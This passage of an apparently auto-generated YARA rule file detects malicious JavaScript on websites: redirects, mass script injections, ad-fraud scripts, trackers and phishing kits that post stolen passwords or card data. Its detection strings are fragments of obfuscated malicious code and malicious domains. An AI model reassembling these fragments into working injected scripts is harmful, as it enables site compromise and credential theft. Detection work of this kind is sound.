    strings:
        $trigger = "<script"
    condition:
        $trigger and PR01054 and PR01055
}

private rule PR01056 : trigger
{
    strings:
        $ps0 = "{window.location.href='http://www.'+http_host+'/';"
    condition:
        $ps0
}

rule js_malware_redirectoneencyclopedia_001 : malware
{
    strings:
        $trigger = "oneencyclopedia.com"
    condition:
        $trigger and PR00050 and PR01056
}

private rule PR01057 : trigger
{
    strings:
        $ps0 = "var url = myArray[ri];(function(a,b)"
    condition:
        $ps0
}

rule js_malware_redirect_001 : malware
{
    strings:
        $trigger = "<script>"
    condition:
        $trigger and PR01057
}

private rule PR01058 : trigger
{
    strings:
        $ps0 = "<script>var a="
    condition:
        $ps0
}

private rule PR01059 : trigger
{
    strings:
        $ps0 = "}c=unescape(b);document.write(c);"
    condition:
        $ps0
}

rule js_malware_redirect_002_001 : malware
{
    strings:
        $trigger = "qapkrv'1G\";"
    condition:
        $trigger and PR01058 and PR01059
}

private rule PR01060 : trigger
{
    strings:
        $ps0 = "var a=\""
    condition:
        $ps0
}

rule js_malware_redirect_002_002 : malware
{
    strings:
        $trigger = "qapkrv'1G\";"
    condition:
        $trigger and PR01059 and PR01060
}

rule js_malware_redirect_005 : malware
{
    strings:
        $trigger = "if(s.indexOf(\"google.co.jp\")>0||s.indexOf("
    condition:
        $trigger and PR00641
}

rule js_malware_redirect_006 : malware
{
    strings:
        $trigger = "%69%66%28%21%6d%79%69%6b%29%7b%0d%0a%76%61%72%20%72"
    condition:
        $trigger and PR00050
}

rule js_malware_redirect_007 : malware
{
    strings:
        $trigger = "h8tt8p://387.18389.580.481/la8ng"
    condition:
        $trigger and PR00323 and PR00348
}

rule js_malware_redirect_008 : malware
{
    strings:
        $trigger = "if (jQuery('#card_number"
    condition:
        $trigger and PR00769
}

private rule PR01061 : trigger
{
    strings:
        $ps0 = "spwms.com/js/', '_blank')"
    condition:
        $ps0
}

rule js_malware_redirect_010 : malware
{
    strings:
        $trigger = "document"
    condition:
        $trigger and PR01061
}

rule js_malware_redirect_011 : malware
{
    strings:
        $trigger = "loc7ati7on"
    condition:
        $trigger and PR00995
}

private rule PR01062 : trigger
{
    strings:
        $ps0 = "var sss"
    condition:
        $ps0
}

rule js_malware_redirect_012 : malware
{
    strings:
        $trigger = "typeof jQuery"
    condition:
        $trigger and PR00658 and PR01062 and PR00660
}

rule js_malware_redirect_014 : malware
{
    strings:
        $trigger = "));parent.document.location.href="
    condition:
        $trigger and PR00653 and PR00889
}

private rule PR01063 : trigger
{
    strings:
        $ps0 = "javascript|encodeURI|src||write|http"
    condition:
        $ps0
}

rule js_malware_redirect_015 : malware
{
    strings:
        $trigger = "return c.toString("
    condition:
        $trigger and PR01063 and PR00604
}

rule js_malware_redirect_016 : malware
{
    strings:
        $trigger = ".length);document.write("
    condition:
        $trigger and PR00050
}

rule js_malware_redirect_016_02 : malware
{
    strings:
        $trigger = ".length);document.write(unescape("
    condition:
        $trigger and PR00050
}

private rule PR01064 : trigger
{
    strings:
        $ps0 = "String['fromCharCode']"
    condition:
        $ps0
}

private rule PR01065 : trigger
{
    strings:
        $ps0 = "XMLHttpRequest:XDomainRequest"
    condition:
        $ps0
}

rule js_malware_redirect_017 : malware
{
    strings:
        $trigger = "typeof jQuery"
    condition:
        $trigger and PR00658 and PR01064 and PR01065 and PR00660
}

private rule PR01066 : trigger
{
    strings:
        $ps0 = "\\x2f\\x62\\x69\\x74\\x6c\\x79\\x2e\\x63\\x6f\\x6d"
    condition:
        $ps0
}

rule js_malware_redirect_018 : malware
{
    strings:
        $trigger = "document[_0x"
    condition:
        $trigger and PR00638 and PR01066
}

private rule PR01067 : trigger
{
    strings:
        $ps0 = "\\x5f\\x6d\\x61\\x75\\x74\\x68\\x74\\x6f\\x6b\\x65\\x6e\\x3d\\x31\\x3b"
    condition:
        $ps0
}

rule js_malware_redirect_019 : malware
{
    strings:
        $trigger = "document[_0x"
    condition:
        $trigger and PR00638 and PR01067
}

private rule PR01068 : trigger
{
    strings:
        $ps0 = "function|return|while||replace|if|17|toString||new|||RegExp"
    condition:
        $ps0
}

rule js_malware_redirect_020 : malware
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR00677 and PR01068
}

private rule PR01069 : trigger
{
    strings:
        $ps0 = "document|location|href"
    condition:
        $ps0
}

rule js_malware_redirect_021 : malware
{
    strings:
        $trigger = "|document|"
    condition:
        $trigger and PR00604 and PR00863 and PR00864 and PR01069
}

private rule PR01070 : trigger
{
    strings:
        $ps0 = "PHNwYW4gaWQ9J2YxODllMjIyLTZkNDItMzZlY"
    condition:
        $ps0
}

rule js_malware_redirect_022 : malware
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00692 and PR00050 and PR01070
}

private rule PR01071 : trigger
{
    strings:
        $ps0 = "|onTimeout|hostssl|iTimeout|POST|php|"
    condition:
        $ps0
}

rule js_malware_redirect_023 : malware
{
    strings:
        $trigger = "fromCharCode"
    condition:
        $trigger and PR00029 and PR01071
}

private rule PR01072 : trigger
{
    strings:
        $ps0 = "]}=curl_exec(${"
    condition:
        $ps0
}

private rule PR01073 : trigger
{
    strings:
        $ps0 = ";if(isset(${$"
    condition:
        $ps0
}

rule js_malware_redirect_024 : malware
{
    strings:
        $trigger = ")){function getUrla($url){if(function_exists("
    condition:
        $trigger and PR01072 and PR01016 and PR01073
}

rule js_malware_redirect_025 : malware
{
    strings:
        $trigger = "\\x49\\x20\\x61\\x6D\\x20\\x6E\\x6F\\x74\\x20\\x61\\x20\\x72\\x6F\\x62\\x6F\\x74"
    condition:
        $trigger and PR00638 and PR00639
}

private rule PR01074 : trigger
{
    strings:
        $ps0 = "atOptions = {"
    condition:
        $ps0
}

private rule PR01075 : trigger
{
    strings:
        $ps0 = "location.protocol"
    condition:
        $ps0
}

rule js_malware_redirect_026 : malware
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR01074 and PR00050 and PR01075
}

private rule PR01076 : trigger
{
    strings:
        $ps0 = "plugins|content|wp"
    condition:
        $ps0
}

rule js_malware_redirect_027 : malware
{
    strings:
        $trigger = "return c.toString("
    condition:
        $trigger and PR01076 and PR00604
}

private rule PR01077 : trigger
{
    strings:
        $ps0 = "<script type=\"text/javascript\" data-cfasync"
    condition:
        $ps0
}

rule js_malware_redirect_028 : malware
{
    strings:
        $trigger = "Function('return\\x20(function()\\x20'+'{}.constructor(\\x22return\\x20this\\x22)(\\x20)'+');')();}catch("
    condition:
        $trigger and PR01077
}

private rule PR01078 : trigger
{
    strings:
        $ps0 = "aXRvdXJsaWZlLnRvcA"
    condition:
        $ps0
}

private rule PR01079 : trigger
{
    strings:
        $ps0 = "href=atob("
    condition:
        $ps0
}

rule js_malware_redirect_029 : malware
{
    strings:
        $trigger = "top.location"
    condition:
        $trigger and PR00050 and PR01078 and PR01079
}

private rule PR01080 : trigger
{
    strings:
        $ps0 = "ZXRiZXN0cHJpemUubG"
    condition:
        $ps0
}

rule js_malware_redirect_030 : malware
{
    strings:
        $trigger = "top.location"
    condition:
        $trigger and PR00050 and PR01080 and PR01079
}

private rule PR01081 : trigger
{
    strings:
        $ps0 = "\")]||'';var"
    condition:
        $ps0
}

private rule PR01082 : trigger
{
    strings:
        $ps0 = "bG9jYWxTdG9yYWdl"
    condition:
        $ps0
}

private rule PR01083 : trigger
{
    strings:
        $ps0 = "dXNlckFnZW50"
    condition:
        $ps0
}

rule js_malware_redirect_031 : malware
{
    strings:
        $trigger = "document.createElement('script')"
    condition:
        $trigger and PR00664 and PR01081 and PR01082 and PR01083 and PR00666
}

private rule PR01084 : trigger
{
    strings:
        $ps0 = "if(window.innerWidth<"
    condition:
        $ps0
}

rule js_malware_redirect_034 : malware
{
    strings:
        $trigger = "location.href='http"
    condition:
        $trigger and PR00050 and PR01084
}

private rule PR01085 : trigger
{
    strings:
        $ps0 = "'186689uDzkzj','su/',"
    condition:
        $ps0
}

rule js_malware_redirect_035 : malware
{
    strings:
        $trigger = "'htt'"
    condition:
        $trigger and PR01085 and PR00641
}

rule js_malware_redirect_036 : malware
{
    strings:
        $trigger = "x6B\\x69\\x65\\x45\\x6E\\x61\\x62\\x6C\\x65\\x64\",\"\\x5F\\x77\\x70\\x74\\x68\\x2D\\x31"
    condition:
        $trigger and PR00638 and PR00639
}

rule js_malware_redirect_037 : malware
{
    strings:
        $trigger = "100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41"
    condition:
        $trigger and PR00676
}

private rule PR01086 : trigger
{
    strings:
        $ps0 = "=\"\\x31\\x30\\x31\\x2c\\x31\\x31\\x38\\x2c\\x39\\x37\\x2c\\x31\\x30\\x38"
    condition:
        $ps0
}

rule js_malware_redirect_gaid_001 : malware
{
    strings:
        $trigger = "window[\"\\x65\\x76\\x61\\x6c\"]("
    condition:
        $trigger and PR01086
}

private rule PR01087 : trigger
{
    strings:
        $ps0 = "%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%20%3D%20%22%68%74%74%70%3A%2F%2F"
    condition:
        $ps0
}

rule js_malware_redirect_orospu_ninja_001 : malware
{
    strings:
        $trigger = "%2E%6F%72%6F%73%70%75%2E%6E%69%6E%6A%61"
    condition:
        $trigger and PR00231 and PR01087
}

rule js_malware_rewrite_ws_001 : malware
{
    strings:
        $trigger = "\\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F\\x72\\x65\\x77\\x72\\x69\\x74\\x65\\x2E\\x77\\x73"
    condition:
        $trigger and PR00050
}

rule js_malware_script_reversed_001 : malware
{
    strings:
        $trigger = "//:ptth\"=crs tpircs<'.split(\"\").reverse().join(\"\"))"
    condition:
        $trigger and PR00769
}

private rule PR01088 : trigger
{
    strings:
        $ps0 = "split(\"\").reverse().join(\"\");return i;"
    condition:
        $ps0
}

rule js_malware_script_reversed_002 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR01088
}

private rule PR01089 : trigger
{
    strings:
        $ps0 = "\\165m\\145n\\164\\56\\167ri\\164\\145\\50\\47\\76\\164pircs"
    condition:
        $ps0
}

rule js_malware_script_reversed_003 : malware
{
    strings:
        $trigger = "this['eval']("
    condition:
        $trigger and PR01089
}

private rule PR01090 : trigger
{
    strings:
        $ps0 = "\"seo-position-report.net/SEO-report/js/seoTrac.js"
    condition:
        $ps0
}

rule js_malware_seopositionreport_001 : malware
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR01090
}

rule js_malware_t_cn_001 : malware
{
    strings:
        $trigger = "|script|appendChild|cn|"
    condition:
        $trigger and PR00865 and PR00604
}

private rule PR01091 : trigger
{
    strings:
        $ps0 = "\"write\",'<script src=\"http://u.1133.cc"
    condition:
        $ps0
}

rule js_malware_u_1133_cc_001 : malware
{
    strings:
        $trigger = "var _$=[\"document\",\"write\",'<script src"
    condition:
        $trigger and PR01091
}

private rule PR01092 : trigger
{
    strings:
        $ps0 = "data:text/javascript;base64"
    condition:
        $ps0
}

private rule PR01093 : trigger
{
    strings:
        $ps0 = "ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJ"
    condition:
        $ps0
}

rule js_malware_unescape_002 : malware
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00050 and PR01092 and PR01093
}

private rule PR01094 : trigger
{
    strings:
        $ps0 = "{init(options)})})({url:'http://"
    condition:
        $ps0
}

rule js_malware_unwantedads_001 : malware
{
    strings:
        $trigger = "adsbygoogle.js');adsScript."
    condition:
        $trigger and PR00371 and PR01094
}

private rule PR01095 : trigger
{
    strings:
        $ps0 = "clksite.com"
    condition:
        $ps0
}

rule js_malware_unwantedads_002 : malware
{
    strings:
        $trigger = "tid=165434_292830"
    condition:
        $trigger and PR00050 and PR01095
}

private rule PR01096 : trigger
{
    strings:
        $ps0 = "(function() { var wc = document.createElement('script');wc.type"
    condition:
        $ps0
}

rule js_malware_unwantedads_003 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR01096
}

private rule PR01097 : trigger
{
    strings:
        $ps0 = "\":/mobile|ip(hone|od|ad)|android|blackberry|iemobile|kindle"
    condition:
        $ps0
}

rule js_malware_unwantedads_004 : malware
{
    strings:
        $trigger = "document["
    condition:
        $trigger and PR01097
}

rule js_malware_unwantedads_005 : malware
{
    strings:
        $trigger = "\\x6F\\x6E\\x63\\x6C\\x6B\\x64\\x73\\x2E\\x63\\x6F\\x6D\\x2F"
    condition:
        $trigger and PR00332
}

private rule PR01098 : trigger
{
    strings:
        $ps0 = "\\x3c\\x53\\x43\\x52\\x49\\x50\\x54"
    condition:
        $ps0
}

rule js_malware_unwantedads_006 : malware
{
    strings:
        $trigger = "\\x7"
    condition:
        $trigger and PR01098
}

rule js_malware_unwantedads_007 : malware
{
    strings:
        $trigger = " src=\"https://s3-eu-west-1.amazonaws.com/assets.cookieconsent.silktide.com/current/plugin.min.js\""
    condition:
        $trigger and PR00050
}

// MANUAL FIX NECESSARY
rule js_malware_unwantedads_009 : malware
{
    strings:
        $trigger = "<script"
        $js_malware_unwantedads_009_r0 = /\(function\(\)[\s]*\{[\s]*var [\w]=window;[\s]*[\w]\[\"[^}]+\\u00[\w]{2}[^}]+\\x[\w]{2}[^}]+\\u00[\w]{2}[^}]+\\x[\w]{2}/
    condition:
        $trigger and $js_malware_unwantedads_009_r0
}

private rule PR01099 : trigger
{
    strings:
        $ps0 = "=[\"\\x3C\\x73\\x63\\x72\\x69\\x70\\x74\\x20\\x74\\x79\\x70"
    condition:
        $ps0
}

rule js_malware_unwantedads_010 : malware
{
    strings:
        $trigger = "document["
    condition:
        $trigger and PR01099
}

private rule PR01100 : trigger
{
    strings:
        $ps0 = "_0x1386|_0xd10fx3"
    condition:
        $ps0
}

rule js_malware_unwantedads_013 : malware
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR01100
}

private rule PR01101 : trigger
{
    strings:
        $ps0 = "|clickund_expert"
    condition:
        $ps0
}

private rule PR01102 : trigger
{
    strings:
        $ps0 = "<script data-cfasync='false' type='text/javascript'>"
    condition:
        $ps0
}

rule js_malware_unwantedads_013_02 : malware
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR01101 and PR01102
}

rule js_malware_unwantedads_013_03 : malware
{
    strings:
        $trigger = "\\x63\\x6C\\x69\\x63\\x6B\\x75\\x6E\\x64\\x5F\\x65\\x78\\x70\\x65\\x72\\x74"
    condition:
        $trigger and PR00641 and PR00669 and PR00670
}

private rule PR01103 : trigger
{
    strings:
        $ps0 = "getCookie(\"clickund_expert"
    condition:
        $ps0
}

rule js_malware_unwantedads_013_04 : malware
{
    strings:
        $trigger = "document"
    condition:
        $trigger and PR01103 and PR00621
}

private rule PR01104 : trigger
{
    strings:
        $ps0 = "frame1\" style=\"background:transparent;border:none;width:1;height:1"
    condition:
        $ps0
}

rule js_malware_unwantedads_014 : malware
{
    strings:
        $trigger = "<iframe src="
    condition:
        $trigger and PR01104
}

private rule PR01105 : trigger
{
    strings:
        $ps0 = ".js?"
    condition:
        $ps0
}

rule js_malware_unwantedads_015 : malware
{
    strings:
        $trigger = "freecounter.ovh"
    condition:
        $trigger and PR00050 and PR01105
}

rule js_malware_unwantedads_016 : malware
{
    strings:
        $trigger = "s.onerror=x.onerror=E;s.onload=x.onload=g;x.send();(document.body||document.documentElement).appendChild(s);function"
    condition:
        $trigger and PR00974
}

private rule PR01106 : trigger
{
    strings:
        $ps0 = ")</script> \",\"\\x77\\x72\\x69\\x74\\x65\\x6C\\x6E\"];document[_0x"
    condition:
        $ps0
}

private rule PR01107 : trigger
{
    strings:
        $ps0 = "s.onerror=x.onerror=E;s.onload=x.onload=g;x.send();"
    condition:
        $ps0
}

rule js_malware_unwantedads_016_02 : malware
{
    strings:
        $trigger = "return String.fromCharCode("
    condition:
        $trigger and PR01106 and PR01107
}

private rule PR01108 : trigger
{
    strings:
        $ps0 = "ocument.createElement(\"script\");script.onload=function(){},script.src=\""
    condition:
        $ps0
}

rule js_malware_unwantedads_017 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR01108 and PR00846
}

private rule PR01109 : trigger
{
    strings:
        $ps0 = "document.write(\"This page has moved, <A"
    condition:
        $ps0
}

private rule PR01110 : trigger
{
    strings:
        $ps0 = "window.top.location.replace(rurl);"
    condition:
        $ps0
}

rule js_malware_unwantedads_018 : malware
{
    strings:
        $trigger = "Click here</A> to go there."
    condition:
        $trigger and PR00050 and PR01109 and PR01110
}

rule js_malware_unwantedadsrun_001 : malware
{
    strings:
        $trigger = "\"http://api.adsrun.net/post\""
    condition:
        $trigger and PR00423
}

private rule PR01111 : trigger
{
    strings:
        $ps0 = "visitorTracker"
    condition:
        $ps0
}

rule js_malware_visitor_tracker_001 : malware
{
    strings:
        $trigger = "var isChrome = !isIE && !!window.chrome && window.navigator.vendor === \"Google Inc.\";"
    condition:
        $trigger and PR01111 and PR00323
}

private rule PR01112 : trigger
{
    strings:
        $ps0 = "return parseInt(ua.substring(edge + 5, ua.indexOf(\".\", edge)), 10);"
    condition:
        $ps0
}

rule js_malware_visitor_tracker_001_002 : malware
{
    strings:
        $trigger = "if(/(android|bb\\d+|meego).+mobile|avantgo|bada\\/|blackberry"
    condition:
        $trigger and PR01112 and PR00323
}

private rule PR01113 : trigger
{
    strings:
        $ps0 = "return /(android|bb\\d+|meego).+mobile"
    condition:
        $ps0
}

rule js_malware_visitor_tracker_001_003 : malware
{
    strings:
        $trigger = "document"
    condition:
        $trigger and PR01111 and PR01113
}

private rule PR01114 : trigger
{
    strings:
        $ps0 = "/*visitorTracker*/function visitortracksdel()"
    condition:
        $ps0
}

rule js_malware_visitor_tracker_001_004 : malware
{
    strings:
        $trigger = "document"
    condition:
        $trigger and PR01114
}

rule js_malware_visitor_tracker_052F_001 : malware
{
    strings:
        $trigger = "/052F\";if("
    condition:
        $trigger and PR00323
}

private rule PR01115 : trigger
{
    strings:
        $ps0 = "|chrome|052F|iPhone|"
    condition:
        $ps0
}

rule js_malware_visitor_tracker_052F_002 : malware
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR01115
}

private rule PR01116 : trigger
{
    strings:
        $ps0 = "|Edge|"
    condition:
        $ps0
}

private rule PR01117 : trigger
{
    strings:
        $ps0 = "|addEventListener|"
    condition:
        $ps0
}

private rule PR01118 : trigger
{
    strings:
        $ps0 = "|v750|"
    condition:
        $ps0
}

rule js_malware_visitor_tracker_052F_003 : malware
{
    strings:
        $trigger = "|052F|"
    condition:
        $trigger and PR00604 and PR01116 and PR01117 and PR01118
}

rule js_phishing_AOLmail_001 : phishing
{
    strings:
        $trigger = "window.location=\"data:text/html;base64,DQoNC"
    condition:
        $trigger and PR00050
}

rule js_phishing_dead_script_zeroo_001 : phishing
{
    strings:
        $trigger = "Dead Script Zeroo"
    condition:
        $trigger and PR00301
}

rule js_phishing_encoded_001 : phishing
{
    strings:
        $trigger = "document.write(unescape('%3C%68%74%6D%6C%3E%0A%3C%68%65%61%64%3E%0A%3C%6C%69%6E%6B%20%72%65%6C%3D%22%73%68%6F%72%74%63%75%74%20%69%63%6F%6E%22%20%68%72%65%66%3D%22%66%61%76%69%2E%69%63%6F%22%20%74%79%70%65%3D%22%69%6D%61%67%65%2F%67%69%66%22%2F%3E%0A%3C%74%69%74%6C%65%3E%4D%61%69%6C"
    condition:
        $trigger
}

private rule PR01119 : trigger
{
    strings:
        $ps0 = "%3c%21%44%4f%43%54%59%50%45%20%68%74%6d"
    condition:
        $ps0
}

rule js_phishing_encoded_002 : phishing
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00050 and PR01119
}

private rule PR01120 : trigger
{
    strings:
        $ps0 = "Chr"
    condition:
        $ps0
}

rule js_phishing_generic_001 : phishing
{
    strings:
        $trigger = "panjang%3Bi++%29%7B%20teks+%3DString.fromCharCode%28le_chaland."
    condition:
        $trigger and PR01120
}

rule js_phishing_generic_002 : phishing
{
    strings:
        $trigger = "\"\\x23\\x67\\x74\\x77\\x79\",\"\\x64\\x6F\\x6E\\x65\",\"\\x63\\x6F\\x6E\\x6E\\x65\\x63\\x74\\x2E\\x70\\x68\\x70\","
    condition:
        $trigger
}

private rule PR01121 : trigger
{
    strings:
        $ps0 = "top.location = 'http://bancanet.banamex.com.mx"
    condition:
        $ps0
}

rule js_phishing_generic_003 : phishing
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR01121
}

rule js_phishing_generic_004 : phishing
{
    strings:
        $trigger = "<b>EMAIL QUOTA EXCEEDED LOGIN TO UPGRADE"
    condition:
        $trigger and PR00050 and PR00323
}

rule js_phishing_generic_005 : phishing
{
    strings:
        $trigger = "type: \"POST\", url: \"hello.php\", data: { \"email\" : the_email , \"password\" : the_password }, success: function(data)"
    condition:
        $trigger
}

rule js_phishing_generic_006 : phishing
{
    strings:
        $trigger = "dataString = 'username='+username+'&password='+password"
    condition:
        $trigger and PR00301
}

rule js_phishing_generic_007 : phishing
{
    strings:
        $trigger = "\",x=\"\";for(i=0;i<t.length;i+=3){x+=unescape(\"%\"+t.substr(i,2));}document.write(x);"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule js_phishing_generic_009 : phishing
{
    strings:
        $trigger = "submitHandler: function(form)"
        $js_phishing_generic_009_r0 = /submitHandler:[\s]*function\(form\)[\s]*\{[\s]*\$\(.[\S]+\)\.show\(\);[\s]*\$.post\(.[^$]+\$\(..[\w]+.\).serialize\(\),[\s]*function\(result\)\{[^$]+\$\(location\).attr\(.href.,/
    condition:
        $trigger and $js_phishing_generic_009_r0
}

rule js_phishing_generic_010 : phishing
{
    strings:
        $trigger = "$.post(\"login.php\", {username:username, pass:pass}, function(data){"
    condition:
        $trigger and PR00653 and PR00371
}

private rule PR01122 : trigger
{
    strings:
        $ps0 = "Visit spKINGS"
    condition:
        $ps0
}

rule js_phishing_generic_013 : phishing
{
    strings:
        $trigger = "decrypt"
    condition:
        $trigger and PR01122
}

rule js_phishing_generic_014 : phishing
{
    strings:
        $trigger = "\\u0009\\u003c\\u0074\\u0069\\u0074\\u006c\\u0065\\u003e\\u004e\\u0065\\u0074\\u0073\\u0020\\u0056\\u0065\\u0072\\u0069\\u0066\\u0069\\u0065\\u0064\\u0020\\u0062\\u0079\\u0020"
    condition:
        $trigger and PR00323
}

rule js_phishing_generic_015 : phishing
{
    strings:
        $trigger = "window.location.href = 'https://beacon.labor.maryland.gov"
    condition:
        $trigger and PR00042
}

private rule PR01123 : trigger
{
    strings:
        $ps0 = "passw"
    condition:
        $ps0
}

rule js_phishing_hinet_001 : phishing
{
    strings:
        $trigger = "deleteCookie(\"BusinessPasswd\", \"/\", \"webmail.hinet.net\" );"
    condition:
        $trigger and PR00301 and PR01123
}

private rule PR01124 : trigger
{
    strings:
        $ps0 = "PayPal Valid Email Checker"
    condition:
        $ps0
}

rule js_phishing_mailer_001 : phishing
{
    strings:
        $trigger = "document.cookie"
    condition:
        $trigger and PR00371 and PR01124
}

rule js_phishing_microsoft_001 : phishing
{
    strings:
        $trigger = "%3C%74%69%74%6C%65%3E%53%69%67%6E%20%69%6E%20%74%6F%20%79%6F%75%72%20%4D%69%63%72%6F%73%6F%66%74"
    condition:
        $trigger and PR00231
}

rule js_phishing_microsoft_002 : phishing
{
    strings:
        $trigger = "window.location.href=\"https://login.microsoftonline.com/common/oauth2/\""
    condition:
        $trigger
}

rule js_phishing_microsoft_003 : phishing
{
    strings:
        $trigger = "]=\"A single Microsoft account gets you into <b>Hotmail<"
    condition:
        $trigger and PR00408
}

private rule PR01125 : trigger
{
    strings:
        $ps0 = "<form id=\"frmLogin\"action=\"'+login_frm_path+'\"method=\"post\"target=\"_top\">"
    condition:
        $ps0
}

rule js_phishing_netvigator_001 : phishing
{
    strings:
        $trigger = "netvigator.com"
    condition:
        $trigger and PR01125
}

rule js_phishing_netvigator_002 : phishing
{
    strings:
        $trigger = "window.open('https://netpass.netvigator.com/netpass/servlet/NPMainServlet?action=np_logout&loadBean=yes&successurl=http://www.netvigator.com/&failurl=http://www.netvigator.com/'"
    condition:
        $trigger
}

private rule PR01126 : trigger
{
    strings:
        $ps0 = "= '';"
    condition:
        $ps0
}

rule js_phishing_paypal_004 : phishing
{
    strings:
        $trigger = "if(Math.floor((tmp/Math.pow("
    condition:
        $trigger and PR01126 and PR00622 and PR00224
}

private rule PR01127 : trigger
{
    strings:
        $ps0 = "fromCharCode(enkripsi"
    condition:
        $ps0
}

rule js_phishing_script_001 : phishing
{
    strings:
        $trigger = "function generate_url"
    condition:
        $trigger and PR01127 and PR00224
}

private rule PR01128 : trigger
{
    strings:
        $ps0 = "();while(!![]){try{var"
    condition:
        $ps0
}

rule js_phishing_script_002 : phishing
{
    strings:
        $trigger = "function("
    condition:
        $trigger and PR00050 and PR00669 and PR00639 and PR01128 and PR01030
}

private rule PR01129 : trigger
{
    strings:
        $ps0 = "messages':{'adminpass"
    condition:
        $ps0
}

rule js_phishing_toolkit_001 : phishing
{
    strings:
        $trigger = "#gossn"
    condition:
        $trigger and PR00323 and PR01129
}

private rule PR01130 : trigger
{
    strings:
        $ps0 = "]);document[_"
    condition:
        $ps0
}

private rule PR01131 : trigger
{
    strings:
        $ps0 = "cvv':'','pin"
    condition:
        $ps0
}

rule js_phishing_toolkit_002 : phishing
{
    strings:
        $trigger = "input[name=\\x22cvv\\x22]"
    condition:
        $trigger and PR01130 and PR01131
}

// MANUAL FIX NECESSARY
rule js_redirect_document_location_002 : redirect
{
    strings:
        $trigger = "location"
        $js_redirect_document_location_002_r0 = /var[\s]*[\w]+[\s]*=[\s]*new[\s]*Date;[\s]*if\([\s]*[\w]+\.getMonth\(\)[\s]*>[\s]*[\d]+[\s]*\)[\s]*document.location.replace\(.http[^;]+\);/
    condition:
        $trigger and PR00323 and $js_redirect_document_location_002_r0
}

rule js_redirect_mass_injection_001 : redirect
{
    strings:
        $trigger = "adsformarket.com"
    condition:
        $trigger and PR00050
}

private rule PR01132 : trigger
{
    strings:
        $ps0 = "d.getElementsByTagName('head')[0].appendChild(s);"
    condition:
        $ps0
}

rule js_redirect_mass_injection_001_02 : redirect
{
    strings:
        $trigger = "document.currentScript.parentNode.insertBefore(s, document.currentScript);"
    condition:
        $trigger and PR01132
}

// MANUAL FIX NECESSARY
private rule PR01133 : trigger
{
    strings:
        $ps0 = "ocument.currentScript.parentNode.insertBefore(s, document.currentScript);"
    condition:
        $ps0
}

rule js_redirect_mass_injection_001_03 : redirect
{
    strings:
        $trigger = "d.getElementsByTagName('head')[0].appendChild(s);"
        $js_redirect_mass_injection_001_03_r0 = /var [\w]+[\s]*=[\s]*[\d]+;[\s]*var d[\s]*=[\s]*document;[\s]*var s[\s]*=[\s]*d\.createElement/
    condition:
        $trigger and PR01133 and $js_redirect_mass_injection_001_03_r0
}

rule js_redirect_mass_injection_002 : redirect
{
    strings:
        $trigger = "gotosecond2.com"
    condition:
        $trigger and PR00050
}

rule js_redirect_mass_injection_003 : redirect
{
    strings:
        $trigger = "destinyfernandi.com"
    condition:
        $trigger and PR00050
}

rule js_redirect_mass_injection_004 : redirect
{
    strings:
        $trigger = "greenlabelfrancisco.com"
    condition:
        $trigger and PR00050
}

private rule PR01134 : trigger
{
    strings:
        $ps0 = "collectfasttracks.com"
    condition:
        $ps0
}

rule js_redirect_mass_injection_005 : redirect
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR01134
}

rule js_redirect_mass_injection_006 : redirect
{
    strings:
        $trigger = "verybeatifulantony.com"
    condition:
        $trigger and PR00050
}

private rule PR01135 : trigger
{
    strings:
        $ps0 = "r.aba.ooo"
    condition:
        $ps0
}

rule js_redirect_mass_injection_007 : redirect
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR01135
}

rule js_redirect_mass_injection_008 : redirect
{
    strings:
        $trigger = "resolutiondestin.com"
    condition:
        $trigger and PR00050
}

rule js_redirect_mass_injection_009 : redirect
{
    strings:
        $trigger = "stivenfernando.com"
    condition:
        $trigger and PR00050
}

rule js_redirect_mass_injection_010 : redirect
{
    strings:
        $trigger = "trackstatisticsss.com"
    condition:
        $trigger and PR00050
}

rule js_redirect_mass_injection_011 : redirect
{
    strings:
        $trigger = "digestcolect.com"
    condition:
        $trigger and PR00050
}

rule js_redirect_mass_injection_012 : redirect
{
    strings:
        $trigger = "developfirstline.com"
    condition:
        $trigger and PR00050
}

rule js_redirect_mass_injection_013 : redirect
{
    strings:
        $trigger = "dontstopthismusics.com"
    condition:
        $trigger and PR00050
}

rule js_redirect_mass_injection_014 : redirect
{
    strings:
        $trigger = "lobbydesires.com"
    condition:
        $trigger and PR00050
}

private rule PR01136 : trigger
{
    strings:
        $ps0 = "letsmakeparty3"
    condition:
        $ps0
}

rule js_redirect_mass_injection_015 : redirect
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR01136
}

rule js_redirect_mass_injection_016 : redirect
{
    strings:
        $trigger = "developerstatss.ga"
    condition:
        $trigger and PR00050
}

rule js_redirect_mass_injection_017 : redirect
{
    strings:
        $trigger = "donatelloflowfirstly.ga"
    condition:
        $trigger and PR00050
}

rule js_redirect_mass_injection_021 : redirect
{
    strings:
        $trigger = "hostingcloud.racing"
    condition:
        $trigger and PR00050
}

rule js_redirect_mass_injection_021_02 : redirect
{
    strings:
        $trigger = "JSON.parse(atob(\"eyJ0aHJ"
    condition:
        $trigger and PR00050
}

private rule PR01137 : trigger
{
    strings:
        $ps0 = "return 0x1;}return 0x0;}biggger()==0x0&&smalller();"
    condition:
        $ps0
}

rule js_redirect_mass_injection_022 : redirect
{
    strings:
        $trigger = "document[_0x"
    condition:
